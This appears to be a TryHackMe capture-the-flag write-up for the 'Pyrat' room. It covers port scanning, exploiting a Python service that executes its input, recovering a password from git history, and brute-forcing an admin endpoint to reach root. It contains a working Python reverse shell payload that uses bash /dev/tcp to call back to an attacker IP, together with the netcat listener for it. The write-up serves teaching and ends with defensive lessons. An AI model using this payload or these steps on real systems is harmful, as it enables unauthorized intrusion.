@@ -1,0 +1,68 @@
+TryHackMe: Pyrat - Room Writeup
+
+Difficulty: Easy
+
+Focus: Python Insecure Execution, Git Forensics, Service Fuzzing
+
+1. Enumeration & Scanning
+The process began with a standard Nmap scan to identify open ports and services:
+
+Bash
+nmap -sV -sC -p- <TARGET_IP>
+Open Ports:
+
+Port 22 (SSH): Standard OpenSSH service.
+
+Port 8000 (HTTP): Running a custom Python-based web service.
+
+When accessing http://<TARGET_IP>:8000 via a browser, the page returned a simple string: "Try a simple request". This hinted that the server expects raw input rather than standard web navigation.
+
+2. Initial Access: Python RCE
+Connecting to the service using Netcat revealed an interactive prompt:
+
+Bash
+nc <TARGET_IP> 8000
+By testing various inputs, I discovered that the backend was passing input directly into a Python exec() or eval() function. While 2+2 returned nothing (indicating exec behavior), entering ; whoami triggered a Python SyntaxError, confirming the vulnerability.
+
+Exploit Payload
+To gain a shell, I executed a Python-based reverse shell payload:
+
+Python
+__import__('os').system('bash -c "bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1"')
+After setting up a listener (nc -lvnp 1234), I received a shell as the www-data user.
+
+3. Lateral Movement: User 'think'
+While performing post-exploitation, I ran LinPeas to find privilege escalation vectors. Although www-data was highly restricted, I discovered a development directory at /opt/dev.
+
+Git Forensics
+Inside /opt/dev, there was a hidden .git folder. I investigated the commit history to look for leaked credentials:
+
+Bash
+git log -p
+Reviewing the logs revealed a previously deleted or modified configuration that contained the password for the user think.
+
+Credential Found: think:<PASSWORD>
+
+Using these credentials, I switched users via su think (or logged in via SSH) and successfully captured the user.txt flag.
+
+4. Privilege Escalation to Root
+After becoming think, standard checks (Sudo, SUID, Cron) yielded no results. Remembering the room description mentioned "endpoints," I returned to the service on port 8000.
+
+Service Fuzzing
+I noticed that the script on port 8000 responded differently to specific keywords. I wrote a small fuzzing script to test different "endpoints" or commands.
+
+Discovery: Sending the word admin changed the prompt to a password request.
+
+Brute Force: By brute-forcing the password for the admin endpoint (using a common wordlist), I found a weak password.
+
+The Root Shell
+Once the correct password was entered under the admin endpoint, the service granted a Root Shell. I was then able to navigate to the root directory and read the final flag.
+
+Root Flag: root.txt
+
+5. Key Takeaways
+Insecure Function Usage: Using eval() or exec() on user-supplied input is a critical security flaw leading to Remote Code Execution (RCE).
+
+Git Hygiene: Developers must ensure that sensitive credentials are never committed to a Git repository, as they remain in the history even after deletion.
+
+Service Logic: Sometimes, the path to root isn't through a system exploit, but through understanding the custom logic of the application running on the server.
